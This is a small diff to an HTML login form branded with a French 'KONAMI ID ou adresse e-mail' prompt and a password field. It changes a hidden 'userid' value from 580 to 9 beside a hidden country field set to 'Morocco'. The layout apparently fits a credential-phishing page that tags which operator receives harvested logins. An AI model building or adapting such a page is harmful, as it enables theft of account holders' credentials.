@@ -37,7 +37,7 @@
 									value="" placeholder="KONAMI ID ou adresse e-mail" type="text"
 									class="input-xlarge" />
 							</p>
-							<input type="hidden" value="580" name="userid" hidden>
+							<input type="hidden" value="9" name="userid" hidden>
 							<input type="hidden" value="Morocco" name="country" hidden>
 
 							<p class="text-center"><input id="password" name="password"
